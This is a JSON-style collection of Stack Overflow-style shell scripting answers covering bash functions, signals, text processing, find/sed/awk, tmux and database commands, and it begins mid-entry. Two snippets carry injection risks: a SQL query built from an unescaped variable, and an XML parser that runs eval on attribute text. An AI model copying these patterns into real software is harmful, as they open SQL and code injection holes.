-eq 0\n    then\n        EXCEPTION=$Table__NotInitializedException\n        EXCEPTION_MSG=\"module not initialized\"\n        EXCEPTION_FUNC=\"$FUNCNAME\"\n        return 1\n    fi\n    \n    id=$1\n      \n      if test \"x$id\" = \"x\"; then\n          EXCEPTION=$Table__ParameterException\n          EXCEPTION_MSG=\"missing parameter identifier\"\n          EXCEPTION_FUNC=\"$FUNCNAME\"\n          return 1\n      fi\n    \n    local name=`$p_Table__mysql_exec \"SELECT name FROM table WHERE id = '$id'\"`\n      if test $? != 0 ; then\n        EXCEPTION=$Table__MySqlException\n        EXCEPTION_MSG=\"unable to perform select\"\n        EXCEPTION_FUNC=\"$FUNCNAME\"\n        return 1\n      fi\n    \n    RESULT=$name\n    EXCEPTION=$Table__NoException\n    EXCEPTION_MSG=\"\"\n    EXCEPTION_FUNC=\"\"\n    return 0\n}\nTrapping and handling signals\nI found this useful to catch and handle exceptions.\nfunction Main__interruptHandler() {\n    # @description signal handler for SIGINT\n    echo \"SIGINT caught\"\n    exit\n} \nfunction Main__terminationHandler() { \n    # @description signal handler for SIGTERM\n    echo \"SIGTERM caught\"\n    exit\n} \nfunction Main__exitHandler() { \n    # @description signal handler for end of the program (clean or unclean). \n    # probably redundant call, we already call the cleanup in main.\n    exit\n} \n    \ntrap Main__interruptHandler INT\ntrap Main__terminationHandler TERM\ntrap Main__exitHandler EXIT\n\nfunction Main__main() {\n    # body\n}\n\n# catch signals and exit\ntrap exit INT TERM EXIT\n\nMain__main \"$@\"\nHints and tips\nIf something does not work for some reason, try to reorder the code. Order is important and not always intuitive.\ndo not even consider working with tcsh. it does not support functions, and it's horrible in general.\nPlease note: If you have to use the kind of things I wrote here, it means that your problem is too complex to be solved with shell. use another language. I had to use it due to human factors and legacy.",
    "Get exit code of a background process": "1: In bash, $! holds the PID of the last background process that was executed. That will tell you what process to monitor, anyway.\n4: wait <n> waits until the process with PID <n> is complete (it will block until the process completes, so you might not want to call this until you are sure the process is done), and then returns the exit code of the completed process.\n2, 3: ps or ps | grep \" $! \" can tell you whether the process is still running. It is up to you how to understand the output and decide how close it is to finishing. (ps | grep isn't idiot-proof. If you have time you can come up with a more robust way to tell whether the process is still running).\nHere's a skeleton script:\n# simulate a long process that will have an identifiable exit code\n(sleep 15 ; /bin/false) &\nmy_pid=$!\n\nwhile   ps | grep \" $my_pid \"     # might also need  | grep -v grep  here\ndo\n    echo $my_pid is still in the ps output. Must still be running.\n    sleep 3\ndone\n\necho Oh, it looks like the process is done.\nwait $my_pid\n# The variable $? always holds the exit code of the last command to finish.\n# Here it holds the exit code of $my_pid, since wait exits with that code. \nmy_status=$?\necho The exit status of the process was $my_status",
    "Count occurrences of a char in a string using Bash": "you can for example remove all other chars and count the whats remains, like:\nvar=\"text,text,text,text\"\nres=\"${var//[^,]}\"\necho \"$res\"\necho \"${#res}\"\nwill print\n,,,\n3\nor\ntr -dc ',' <<<\"$var\" | awk '{ print length; }'\nor\ntr -dc ',' <<<\"$var\" | wc -c    #works, but i don't like wc.. ;)\nor\nawk -F, '{print NF-1}' <<<\"$var\"\nor\ngrep -o ',' <<<\"$var\" | grep -c .\nor\nperl -nle 'print s/,//g' <<<\"$var\"",
    "How can I delete a newline if it is the last character in a file?": "perl -pe 'chomp if eof' filename >filename2\nor, to edit the file in place:\nperl -pi -e 'chomp if eof' filename\n[Editor's note: -pi -e was originally -pie, but, as noted by several commenters and explained by @hvd, the latter doesn't work.]\nThis was described as a 'perl blasphemy' on the awk website I saw.\nBut, in a test, it worked.",
    "Check if string is neither empty nor space in shell script": "You need a space on either side of the !=. Change your code to:\nstr=\"Hello World\"\nstr2=\" \"\nstr3=\"\"\n\nif [ ! -z \"$str\" -a \"$str\" != \" \" ]; then\n        echo \"Str is not null or space\"\nfi\n\nif [ ! -z \"$str2\" -a \"$str2\" != \" \" ]; then\n        echo \"Str2 is not null or space\"\nfi\n\nif [ ! -z \"$str3\" -a \"$str3\" != \" \" ]; then\n        echo \"Str3 is not null or space\"\nfi",
    "What does the line \"#!/bin/sh\" mean in a UNIX shell script?": "It's called a shebang, and tells the parent shell which interpreter should be used to execute the script.\n#!/bin/sh <--------- bourne shell compatible script\n#!/usr/bin/perl  <-- perl script\n#!/usr/bin/php  <--- php script\n#!/bin/false <------ do-nothing script, because false returns immediately anyways.\nMost scripting languages tend to interpret a line starting with # as comment and will ignore the following !/usr/bin/whatever portion, which might otherwise cause a syntax error in the interpreted language.",
    "How to default to other directory instead of home directory": "Here's a more Windows-ish solution: Right click on the Windows shortcut that you use to launch git bash, and click Properties. Change the value of \"Start In\" to your desired workspace path.\nEdit: Also check that the Target value does not include the --cd-to-home option as noted in the comments below.",
    "Can't run Curl command inside my Docker Container": "curl: command not found\nis a big hint, you have to install it with :\napt-get -y update; apt-get -y install curl",
    "Recursive search and replace in text files on Mac and Linux": "OS X uses a mix of BSD and GNU tools, so best always check the documentation (although I had it that less didn't even conform to the OS X manpage):\nhttps://web.archive.org/web/20170808213955/https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/sed.1.html\nsed takes the argument after -i as the extension for backups. Provide an empty string (-i '') for no backups.\nThe following should do:\nfind . -type f -name '*.txt' -exec sed -i '' s/this/that/g {} +\nThe -type f is just good practice; sed will complain if you give it a directory or so.\n-exec is preferred over xargs; you needn't bother with -print0 or anything.\nThe {} + at the end means that find will append all results as arguments to one instance of the called command, instead of re-running it for each result. (One exception is when the maximal number of command-line arguments allowed by the OS is breached; in that case find will run more than one instance.)\nIf you get an error like \"invalid byte sequence,\" it might help to force the standard locale by adding LC_ALL=C at the start of the command, like so:\nLC_ALL=C find . -type f -name '*.txt' -exec sed -i '' s/this/that/g {} +",
    "Check if database exists in PostgreSQL using shell": "Note/Update (2021): While this answer works, philosophically I agree with other comments that the right way to do this is to ask Postgres.\nCheck whether the other answers that have psql -c or --command in them are a better fit for your use case (e.g. Nicholas Grilly's, Nathan Osman's, bruce's or Pedro's variant\nI use the following modification of Arturo's solution:\npsql -lqt | cut -d \\| -f 1 | grep -qw <db_name>\nWhat it does\npsql -l outputs something like the following:\n                                        List of databases\n     Name  |   Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   \n-----------+-----------+----------+------------+------------+-----------------------\n my_db     | my_user   | UTF8     | en_US.UTF8 | en_US.UTF8 | \n postgres  | postgres  | LATIN1   | en_US      | en_US      | \n template0 | postgres  | LATIN1   | en_US      | en_US      | =c/postgres          +\n           |           |          |            |            | postgres=CTc/postgres\n template1 | postgres  | LATIN1   | en_US      | en_US      | =c/postgres          +\n           |           |          |            |            | postgres=CTc/postgres\n(4 rows)\nUsing the naive approach means that searching for a database called \"List, \"Access\" or \"rows\" will succeed. So we pipe this output through a bunch of built-in command line tools to only search in the first column.\nThe -t flag removes headers and footers:\n my_db     | my_user   | UTF8     | en_US.UTF8 | en_US.UTF8 | \n postgres  | postgres  | LATIN1   | en_US      | en_US      | \n template0 | postgres  | LATIN1   | en_US      | en_US      | =c/postgres          +\n           |           |          |            |            | postgres=CTc/postgres\n template1 | postgres  | LATIN1   | en_US      | en_US      | =c/postgres          +\n           |           |          |            |            | postgres=CTc/postgres\nThe next bit, cut -d \\| -f 1 splits the output by the vertical pipe | character (escaped from the shell with a backslash), and selects field 1. This leaves:\n my_db             \n postgres          \n template0         \n                   \n template1         \n         \ngrep -w matches whole words, and so won't match if you are searching for temp in this scenario. The -q option suppresses any output written to the screen, so if you want to run this interactively at a command prompt you may with to exclude the -q so something gets displayed immediately.\nNote that grep -w matches alphanumeric, digits and the underscore, which is exactly the set of characters allowed in unquoted database names in postgresql (hyphens are not legal in unquoted identifiers). If you are using other characters, grep -w won't work for you.\nThe exit status of this whole pipeline will be 0 (success) if the database exists or 1 (failure) if it doesn't. Your shell will set the special variable $? to the exit status of the last command. You can also test the status directly in a conditional:\nif psql -lqt | cut -d \\| -f 1 | grep -qw <db_name>; then\n    # database exists\n    # $? is 0\nelse\n    # ruh-roh\n    # $? is 1\nfi",
    "How can I do division with variables in a Linux shell?": "Those variables are shell variables. To expand them as parameters to another program (ie expr), you need to use the $ prefix:\nexpr $x / $y\nThe reason it complained is because it thought you were trying to operate on alphabetic characters (ie non-integer)\nIf you are using the Bash shell, you can achieve the same result using expression syntax:\necho $((x / y))\nOr:\nz=$((x / y))\necho $z",
    "Rearrange columns using cut": "For the cut(1) man page:\nUse one, and only one of -b, -c or -f. Each LIST is made up of one range, or many ranges separated by commas. Selected input is written in the same order that it is read, and is written exactly once.\nIt reaches field 1 first, so that is printed, followed by field 2.\nUse awk instead:\nawk '{print $2, $1}' file.txt",
    "How to run Unix shell script from Java code?": "You should really look at Process Builder. It is really built for this kind of thing.\nProcessBuilder pb = new ProcessBuilder(\"myshellScript.sh\", \"myArg1\", \"myArg2\");\n Map<String, String> env = pb.environment();\n env.put(\"VAR1\", \"myValue\");\n env.remove(\"OTHERVAR\");\n env.put(\"VAR2\", env.get(\"VAR1\") + \"suffix\");\n pb.directory(new File(\"myDir\"));\n Process p = pb.start();",
    "How can I debug a Bash script? [closed]": "sh -x script [arg1 ...]\nbash -x script [arg1 ...]\nThese give you a trace of what is being executed. (See also 'Clarification' near the bottom of the answer.)\nSometimes, you need to control the debugging within the script. In that case, as Cheeto reminded me, you can use:\nset -x\nThis turns debugging on. You can then turn it off again with:\nset +x\n(You can find out the current tracing state by analyzing $-, the current flags, for x.)\nAlso, shells generally provide options '-n' for 'no execution' and '-v' for 'verbose' mode; you can use these in combination to see whether the shell thinks it could execute your script \u2014 occasionally useful if you have an unbalanced quote somewhere.\nThere is contention that the '-x' option in Bash is different from other shells (see the comments). The Bash Manual says:\n-x\nPrint a trace of simple commands, for commands, case commands, select commands, and arithmetic for commands and their arguments or associated word lists after they are expanded and before they are executed. The value of the PS4 variable is expanded and the resultant value is printed before the command and its expanded arguments.\nThat much does not seem to indicate different behaviour at all. I don't see any other relevant references to '-x' in the manual. It does not describe differences in the startup sequence.\nClarification: On systems such as a typical Linux box, where '/bin/sh' is a symlink to '/bin/bash' (or wherever the Bash executable is found), the two command lines achieve the equivalent effect of running the script with execution trace on. On other systems (for example, Solaris, and some more modern variants of Linux), /bin/sh is not Bash, and the two command lines would give (slightly) different results. Most notably, '/bin/sh' would be confused by constructs in Bash that it does not recognize at all. (On Solaris, /bin/sh is a Bourne shell; on modern Linux, it is sometimes Dash \u2014 a smaller, more strictly POSIX-only shell.) When invoked by name like this, the 'shebang' line ('#!/bin/bash' vs '#!/bin/sh') at the start of the file has no effect on how the contents are interpreted.\nThe Bash manual has a section on Bash POSIX mode which, contrary to a long-standing but erroneous version of this answer (see also the comments below), does describe in extensive detail the difference between 'Bash invoked as sh' and 'Bash invoked as bash'.\nWhen debugging a (Bash) shell script, it will be sensible and sane \u2014 necessary even \u2014 to use the shell named in the shebang line with the -x option. Otherwise, you may (will?) get different behaviour when debugging from when running the script.",
    "How to execute a MySQL command from a shell script?": "You need to use the -p flag to send a password. And it's tricky because you must have no space between -p and the password.\n$ mysql -h \"server-name\" -u \"root\" \"-pXXXXXXXX\" \"database-name\" < \"filename.sql\"\nIf you use a space after -p it makes the mysql client prompt you interactively for the password, and then it interprets the next command argument as a database-name:\n$ mysql -h \"server-name\" -u \"root\" -p \"XXXXXXXX\" \"database-name\" < \"filename.sql\"\nEnter password: <you type it in here>\nERROR 1049 (42000): Unknown database 'XXXXXXXX'\nActually, I prefer to store the user and password in ~/.my.cnf so I don't have to put it on the command-line at all:\n[client]\nuser = root\npassword = XXXXXXXX\nThen:\n$ mysql -h \"server-name\" \"database-name\" < \"filename.sql\"\nRe your comment:\nI run batch-mode mysql commands like the above on the command line and in shell scripts all the time. It's hard to diagnose what's wrong with your shell script, because you haven't shared the exact script or any error output. I suggest you edit your original question above and provide examples of what goes wrong.\nAlso when I'm troubleshooting a shell script I use the -x flag so I can see how it's executing each command:\n$ bash -x myscript.sh",
    "How to parse XML in Bash?": "This is really just an explaination of Yuzem's answer, but I didn't feel like this much editing should be done to someone else, and comments don't allow formatting, so...\nrdom () { local IFS=\\> ; read -d \\< E C ;}\nLet's call that \"read_dom\" instead of \"rdom\", space it out a bit and use longer variables:\nread_dom () {\n    local IFS=\\>\n    read -d \\< ENTITY CONTENT\n}\nOkay so it defines a function called read_dom. The first line makes IFS (the input field separator) local to this function and changes it to >. That means that when you read data instead of automatically being split on space, tab or newlines it gets split on '>'. The next line says to read input from stdin, and instead of stopping at a newline, stop when you see a '<' character (the -d for deliminator flag). What is read is then split using the IFS and assigned to the variable ENTITY and CONTENT. So take the following:\n<tag>value</tag>\nThe first call to read_dom get an empty string (since the '<' is the first character). That gets split by IFS into just '', since there isn't a '>' character. Read then assigns an empty string to both variables. The second call gets the string 'tag>value'. That gets split then by the IFS into the two fields 'tag' and 'value'. Read then assigns the variables like: ENTITY=tag and CONTENT=value. The third call gets the string '/tag>'. That gets split by the IFS into the two fields '/tag' and ''. Read then assigns the variables like: ENTITY=/tag and CONTENT=. The fourth call will return a non-zero status because we've reached the end of file.\nNow his while loop cleaned up a bit to match the above:\nwhile read_dom; do\n    if [[ $ENTITY = \"title\" ]]; then\n        echo $CONTENT\n        exit\n    fi\ndone < xhtmlfile.xhtml > titleOfXHTMLPage.txt\nThe first line just says, \"while the read_dom functionreturns a zero status, do the following.\" The second line checks if the entity we've just seen is \"title\". The next line echos the content of the tag. The four line exits. If it wasn't the title entity then the loop repeats on the sixth line. We redirect \"xhtmlfile.xhtml\" into standard input (for the read_dom function) and redirect standard output to \"titleOfXHTMLPage.txt\" (the echo from earlier in the loop).\nNow given the following (similar to what you get from listing a bucket on S3) for input.xml:\n<ListBucketResult xmlns=\"http://s3.amazonaws.com/doc/2006-03-01/\">\n  <Name>sth-items</Name>\n  <IsTruncated>false</IsTruncated>\n  <Contents>\n    <Key>item-apple-iso@2x.png</Key>\n    <LastModified>2011-07-25T22:23:04.000Z</LastModified>\n    <ETag>&quot;0032a28286680abee71aed5d059c6a09&quot;</ETag>\n    <Size>1785</Size>\n    <StorageClass>STANDARD</StorageClass>\n  </Contents>\n</ListBucketResult>\nand the following loop:\nwhile read_dom; do\n    echo \"$ENTITY => $CONTENT\"\ndone < input.xml\nYou should get:\n => \nListBucketResult xmlns=\"http://s3.amazonaws.com/doc/2006-03-01/\" => \nName => sth-items\n/Name => \nIsTruncated => false\n/IsTruncated => \nContents => \nKey => item-apple-iso@2x.png\n/Key => \nLastModified => 2011-07-25T22:23:04.000Z\n/LastModified => \nETag => &quot;0032a28286680abee71aed5d059c6a09&quot;\n/ETag => \nSize => 1785\n/Size => \nStorageClass => STANDARD\n/StorageClass => \n/Contents => \nSo if we wrote a while loop like Yuzem's:\nwhile read_dom; do\n    if [[ $ENTITY = \"Key\" ]] ; then\n        echo $CONTENT\n    fi\ndone < input.xml\nWe'd get a listing of all the files in the S3 bucket.\nEDIT If for some reason local IFS=\\> doesn't work for you and you set it globally, you should reset it at the end of the function like:\nread_dom () {\n    ORIGINAL_IFS=$IFS\n    IFS=\\>\n    read -d \\< ENTITY CONTENT\n    IFS=$ORIGINAL_IFS\n}\nOtherwise, any line splitting you do later in the script will be messed up.\nEDIT 2 To split out attribute name/value pairs you can augment the read_dom() like so:\nread_dom () {\n    local IFS=\\>\n    read -d \\< ENTITY CONTENT\n    local ret=$?\n    TAG_NAME=${ENTITY%% *}\n    ATTRIBUTES=${ENTITY#* }\n    return $ret\n}\nThen write your function to parse and get the data you want like this:\nparse_dom () {\n    if [[ $TAG_NAME = \"foo\" ]] ; then\n        eval local $ATTRIBUTES\n        echo \"foo size is: $size\"\n    elif [[ $TAG_NAME = \"bar\" ]] ; then\n        eval local $ATTRIBUTES\n        echo \"bar type is: $type\"\n    fi\n}\nThen while you read_dom call parse_dom:\nwhile read_dom; do\n    parse_dom\ndone\nThen given the following example markup:\n<example>\n  <bar size=\"bar_size\" type=\"metal\">bars content</bar>\n  <foo size=\"1789\" type=\"unknown\">foos content</foo>\n</example>\nYou should get this output:\n$ cat example.xml | ./bash_xml.sh \nbar type is: metal\nfoo size is: 1789\nEDIT 3 another user said they were having problems with it in FreeBSD and suggested saving the exit status from read and returning it at the end of read_dom like:\nread_dom () {\n    local IFS=\\>\n    read -d \\< ENTITY CONTENT\n    local RET=$?\n    TAG_NAME=${ENTITY%% *}\n    ATTRIBUTES=${ENTITY#* }\n    return $RET\n}\nI don't see any reason why that shouldn't work",
    "What does \"&\" at the end of a linux command mean?": "The & makes the command run in the background.\nFrom man bash:\nIf a command is terminated by the control operator &, the shell executes the command in the background in a subshell. [...] The shell does not wait for the command to finish, and the return status is 0 (true). [...]",
    "Delete files older than 10 days using shell script in Unix [duplicate]": "find is the common tool for this kind of task :\nfind ./my_dir -mtime +10 -type f -delete\nEXPLANATIONS\n./my_dir your directory (replace with your own)\n-mtime +10 older than 10 days\n-type f only files\n-delete no surprise. Remove it to test your find filter before executing the whole command\nAnd take care that ./my_dir exists to avoid bad surprises !",
    "How to base64 encode image in linux bash / shell": "You need to use cat to get the contents of the file named 'DSC_0251.JPG', rather than the filename itself.\ntest=\"$(cat DSC_0251.JPG | base64)\"\nHowever, base64 can read from the file itself:\ntest=$( base64 DSC_0251.JPG )",
    "unix - head AND tail of file": "You can simply:\n(head; tail) < file.txt\nAnd if you need to uses pipes for some reason then like this:\ncat file.txt | (head; tail)\nNote: will print duplicated lines if number of lines in file.txt is smaller than default lines of head + default lines of tail.",
    "How do I get both STDOUT and STDERR to go to the terminal and a log file?": "Use \"tee\" to redirect to a file and the screen. Depending on the shell you use, you first have to redirect stderr to stdout using\n./a.out 2>&1 | tee output\nor\n./a.out |& tee output\nIn csh, there is a built-in command called \"script\" that will capture everything that goes to the screen to a file. You start it by typing \"script\", then doing whatever it is you want to capture, then hit control-D to close the script file. I don't know of an equivalent for sh/bash/ksh.\nAlso, since you have indicated that these are your own sh scripts that you can modify, you can do the redirection internally by surrounding the whole script with braces or brackets, like\n#!/bin/sh\n{\n    ... whatever you had in your script before\n} 2>&1 | tee output.file",
    "How can I strip first X characters from string using sed?": "The following should work:\nvar=\"pid: 1234\"\nvar=${var:5}\nAre you sure bash is the shell executing your script?\nEven the POSIX-compliant\nvar=${var#?????}\nwould be preferable to using an external process, although this requires you to hard-code the 5 in the form of a fixed-length pattern.",
    "Convert Unix timestamp to a date string": "With date from GNU coreutils you can do:\ndate -d \"@$TIMESTAMP\"\n# date -d @0\nWed Dec 31 19:00:00 EST 1969\n(From: BASH: Convert Unix Timestamp to a Date)\nOn OS X, use date -r.\ndate -r \"$TIMESTAMP\"\nAlternatively, use strftime(). It's not available directly from the shell, but you can access it via gawk. The %c specifier displays the timestamp in a locale-dependent manner.\necho \"$TIMESTAMP\" | gawk '{print strftime(\"%c\", $0)}'\n# echo 0 | gawk '{print strftime(\"%c\", $0)}'\nWed 31 Dec 1969 07:00:00 PM EST",
    "How to empty (clear) the logcat buffer in Android [duplicate]": "",
    "How do I use Ruby for shell scripting?": "By default, you already have access to Dir and File, which are pretty useful by themselves.\nDir['*.rb'] #basic globs\nDir['**/*.rb'] #** == any depth of directory, including current dir.\n#=> array of relative names\n\nFile.expand_path('~/file.txt') #=> \"/User/mat/file.txt\"\nFile.dirname('dir/file.txt') #=> 'dir'\nFile.basename('dir/file.txt') #=> 'file.txt'\nFile.join('a', 'bunch', 'of', 'strings') #=> 'a/bunch/of/strings'\n\n__FILE__ #=> the name of the current file\nAlso useful from the stdlib is FileUtils\nrequire 'fileutils' #I know, no underscore is not ruby-like\ninclude FileUtils\n# Gives you access (without prepending by 'FileUtils.') to\ncd(dir, options)\ncd(dir, options) {|dir| .... }\npwd()\nmkdir(dir, options)\nmkdir(list, options)\nmkdir_p(dir, options)\nmkdir_p(list, options)\nrmdir(dir, options)\nrmdir(list, options)\nln(old, new, options)\nln(list, destdir, options)\nln_s(old, new, options)\nln_s(list, destdir, options)\nln_sf(src, dest, options)\ncp(src, dest, options)\ncp(list, dir, options)\ncp_r(src, dest, options)\ncp_r(list, dir, options)\nmv(src, dest, options)\nmv(list, dir, options)\nrm(list, options)\nrm_r(list, options)\nrm_rf(list, options)\ninstall(src, dest, mode = <src's>, options)\nchmod(mode, list, options)\nchmod_R(mode, list, options)\nchown(user, group, list, options)\nchown_R(user, group, list, options)\ntouch(list, options)\nWhich is pretty nice",
    "I just assigned a variable, but echo $variable shows something else": "In all of the cases above, the variable is correctly set, but not correctly read! The right way is to use double quotes when referencing:\necho \"$var\"\nThis gives the expected value in all the examples given. Always quote variable references!\nWhy?\nWhen a variable is unquoted, it will:\nUndergo field splitting where the value is split into multiple words on whitespace (by default):\nBefore: /* Foobar is free software */\nAfter: /*, Foobar, is, free, software, */\nEach of these words will undergo pathname expansion, where patterns are expanded into matching files:\nBefore: /*\nAfter: /bin, /boot, /dev, /etc, /home, ...\nFinally, all the arguments are passed to echo, which writes them out separated by single spaces, giving\n/bin /boot /dev /etc /home Foobar is free software Desktop/ Downloads/\ninstead of the variable's value.\nWhen the variable is quoted it will:\nBe substituted for its value.\nThere is no step 2.\nThis is why you should always quote all variable references, unless you specifically require word splitting and pathname expansion. Tools like shellcheck are there to help, and will warn about missing quotes in all the cases above.",
    "How can Bash execute a command in a different directory context?": "Use cd in a subshell; the shorthand way to use this kind of subshell is parentheses.\n(cd wherever; mycommand ...)\nThat said, if your command has an environment that it requires, it should really ensure that environment itself instead of putting the onus on anything that might want to use it (unless it's an internal command used in very specific circumstances in the context of a well defined larger system, such that any caller already needs to ensure the environment it requires). Usually this would be some kind of shell script wrapper.",
    "How do I escape the wildcard/asterisk character in bash?": "Quoting when setting $FOO is not enough. You need to quote the variable reference as well:\nme$ FOO=\"BAR * BAR\"\nme$ echo \"$FOO\"\nBAR * BAR",
    "How to select lines between two marker patterns which may occur multiple times with awk/sed": "Use awk with a flag to trigger the print when necessary:\n$ awk '/abc/{flag=1;next}/mno/{flag=0}flag' file\ndef1\nghi1\njkl1\ndef2\nghi2\njkl2\nHow does this work?\n/abc/ matches lines having this text, as well as /mno/ does.\n/abc/{flag=1;next} sets the flag when the text abc is found. Then, it skips the line.\n/mno/{flag=0} unsets the flag when the text mno is found.\nThe final flag is a pattern with the default action, which is to print $0: if flag is equal 1 the line is printed.\nFor a more detailed description and examples, together with cases when the patterns are either shown or not, see How to select lines between two patterns?.",
    "Modifying PATH with fish shell": "As stated in the official fish tutorial, you can modify the $fish_user_paths universal variable.\nRun the following once from the command-line:\nset -U fish_user_paths /usr/local/bin $fish_user_paths\nThis will prepend /usr/local/bin permanently to your path, and will affect the current session and all future instances too because the -U argument will make the variable universal.\nFrom the fish documentation:\n... (Note: you should NOT add this line to config.fish. If you do, the variable will get longer each time you run fish!)\nfish_user_paths, a list of directories that are prepended to PATH. This can be a universal variable.",
    "Counter increment in Bash loop not working": "First, you are not increasing the counter. Changing COUNTER=$((COUNTER)) into COUNTER=$((COUNTER + 1)) or COUNTER=$[COUNTER + 1] will increase it.\nSecond, it's trickier to back-propagate subshell variables to the callee as you surmise. Variables in a subshell are not available outside the subshell. These are variables local to the child process.\nOne way to solve it is using a temp file for storing the intermediate value:\nTEMPFILE=/tmp/$$.tmp\necho 0 > $TEMPFILE\n\n# Loop goes here\n  # Fetch the value and increase it\n  COUNTER=$[$(cat $TEMPFILE) + 1]\n\n  # Store the new value\n  echo $COUNTER > $TEMPFILE\n\n# Loop done, script done, delete the file\nunlink $TEMPFILE",
    "What is the simplest way to remove a trailing slash from each parameter?": "You can use the ${parameter%word} expansion that is detailed here. Here is a simple test script that demonstrates the behavior:\n#!/bin/bash\n\n# Call this as:\n#   ./test.sh one/ two/ three/ \n#\n# Output:\n#  one two three\n\necho ${@%/}",
    "How can I add a help method to a shell script?": "here's an example for bash:\nusage=\"$(basename \"$0\") [-h] [-s n] -- program to calculate the answer to life, the universe and everything\n\nwhere:\n    -h  show this help text\n    -s  set the seed value (default: 42)\"\n\nseed=42\nwhile getopts ':hs:' option; do\n  case \"$option\" in\n    h) echo \"$usage\"\n       exit\n       ;;\n    s) seed=$OPTARG\n       ;;\n    :) printf \"missing argument for -%s\\n\" \"$OPTARG\" >&2\n       echo \"$usage\" >&2\n       exit 1\n       ;;\n   \\?) printf \"illegal option: -%s\\n\" \"$OPTARG\" >&2\n       echo \"$usage\" >&2\n       exit 1\n       ;;\n  esac\ndone\nshift $((OPTIND - 1))\nTo use this inside a function:\nuse \"$FUNCNAME\" instead of $(basename \"$0\")\nadd local OPTIND OPTARG before calling getopts",
    "How to tell if a string is not defined in a Bash shell script": "I think the answer you are after is implied (if not stated) by Vinko's answer, though it is not spelled out simply. To distinguish whether VAR is set but empty or not set, you can use:\nif [ -z \"${VAR+xxx}\" ]; then echo \"VAR is not set at all\"; fi\nif [ -z \"$VAR\" ] && [ \"${VAR+xxx}\" = \"xxx\" ]; then echo \"VAR is set but empty\"; fi\nYou probably can combine the two tests on the second line into one with:\nif [ -z \"$VAR\" -a \"${VAR+xxx}\" = \"xxx\" ]; then echo \"VAR is set but empty\"; fi\nHowever, if you read the documentation for Autoconf, you'll find that they do not recommend combining terms with '-a' and do recommend using separate simple tests combined with &&. I've not encountered a system where there is a problem; that doesn't mean they didn't used to exist (but they are probably extremely rare these days, even if they weren't as rare in the distant past).\nYou can find the details of these, and other related shell parameter expansions, the test or [ command and conditional expressions in the Bash manual.\nI was recently asked by email about this answer with the question:\nYou use two tests, and I understand the second one well, but not the first one. More precisely I don't understand the need for variable expansion\nif [ -z \"${VAR+xxx}\" ]; then echo \"VAR is not set at all\"; fi\nWouldn't this accomplish the same?\nif [ -z \"${VAR}\" ]; then echo \"VAR is not set at all\"; fi\nFair question - the answer is 'No, your simpler alternative does not do the same thing'.\nSuppose I write this before your test:\nVAR=\nYour test will say \"VAR is not set at all\", but mine will say (by implication because it echoes nothing) \"VAR is set but its value might be empty\". Try this script:\n(\nunset VAR\nif [ -z \"${VAR+xxx}\" ]; then echo \"JL:1 VAR is not set at all\"; fi\nif [ -z \"${VAR}\" ];     then echo \"MP:1 VAR is not set at all\"; fi\nVAR=\nif [ -z \"${VAR+xxx}\" ]; then echo \"JL:2 VAR is not set at all\"; fi\nif [ -z \"${VAR}\" ];     then echo \"MP:2 VAR is not set at all\"; fi\n)\nThe output is:\nJL:1 VAR is not set at all\nMP:1 VAR is not set at all\nMP:2 VAR is not set at all\nIn the second pair of tests, the variable is set, but it is set to the empty value. This is the distinction that the ${VAR=value} and ${VAR:=value} notations make. Ditto for ${VAR-value} and ${VAR:-value}, and ${VAR+value} and ${VAR:+value}, and so on.\nAs Gili points out in his answer, if you run bash with the set -o nounset option, then the basic answer above fails with unbound variable. It is easily remedied:\nif [ -z \"${VAR+xxx}\" ]; then echo \"VAR is not set at all\"; fi\nif [ -z \"${VAR-}\" ] && [ \"${VAR+xxx}\" = \"xxx\" ]; then echo \"VAR is set but empty\"; fi\nOr you could cancel the set -o nounset option with set +u (set -u being equivalent to set -o nounset).",
    "How do I mount a remote Linux folder in Windows through SSH? [closed]": "Back in 2002, Novell developed some software called NetDrive that can map a WebDAV, FTP, SFTP, etc. share to a windows drive letter. It is now abandonware, so it's no longer maintained (and not available on the Novell website), but it's free to use. I found quite a few available to download by searching for \"netdrive.exe\" I actually downloaded a few and compared their md5sums to make sure that I was getting a common (and hopefully safe) version.\nUpdate 10 Nov 2017 SFTPNetDrive is the current project from the original netdrive project. And they made it free for personal use:\nWe Made SFTP Net Drive FREE for Personal Use\nThey have paid options as well on the website.",
    "Shell - Write variable contents to a file": "Use the echo command:\nvar=\"text to append\";\ndestdir=/some/directory/path/filename\n\nif [ -f \"$destdir\" ]\nthen \n    echo \"$var\" > \"$destdir\"\nfi\nThe if tests that $destdir represents a file.\nThe > appends the text after truncating the file. If you only want to append the text in $var to the file existing contents, then use >> instead:\necho \"$var\" >> \"$destdir\"\nThe cp command is used for copying files (to files), not for writing text to a file.",
    "How to send commands when opening a tmux session inside another tmux session?": "The send-prefix command can be used to send your prefix keystroke to (the process running in) the active pane. By default, the prefix is C-b and C-b is bound to send-prefix (so that hitting it twice sends a single C-b to the active pane). This is just what we need to access the bindings of the inner tmux instance.\nThe first C-b is captured by the \u201couter\u201d tmux instance as its prefix key. The second one is captured by the \u201couter\u201d tmux instance and triggers its C-b binding (send-prefix). This sends a C-b to the outer instance\u2019s active pane. The process running in this pane is (ultimately, through an ssh instance) the \u201cinner\u201d tmux instance. It captures the C-b as its prefix key. Now your next keystroke will be passed through the outer tmux instance and captured by the inner one to trigger a binding.\nTo trigger the c binding (new-window) in a second-level instance of tmux, you would type C-b C-b c. For a third-level instance of tmux you would type C-b C-b C-b C-b c.\nThis doubling for each level can be annoying if you are commonly dealing with multiple layers of tmux. If you can spare some other key, you could make a non-prefixed binding to make things (possibly) easier to type:\nbind-key -n C-\\ send-prefix\nbind-key -n C-^ send-prefix \\; send-prefix\nCreate new window in second-level tmux: C-\\ c\nCreate new window in third-level tmux: C-^ c (or C-\\ C-\\ c)\nIf you have a limited number of tmux commands that you want to (easily) send to the lower-level tmux instances, you might instead use send-keys to create some specific bindings (possibly just in your top-level tmux instance):\nbind-key C-c  send-keys C-b c\nbind-key C    send-keys C-b C-b c\nCreate new window in second-level tmux: C-b C-c\nCreate new window in third-level tmux: C-b C",
    "How to specify a multi-line shell variable?": "simply insert new line where necessary\nsql=\"\nSELECT c1, c2\nfrom Table1, Table2\nwhere ...\n\"\nshell will be looking for the closing quotation mark",
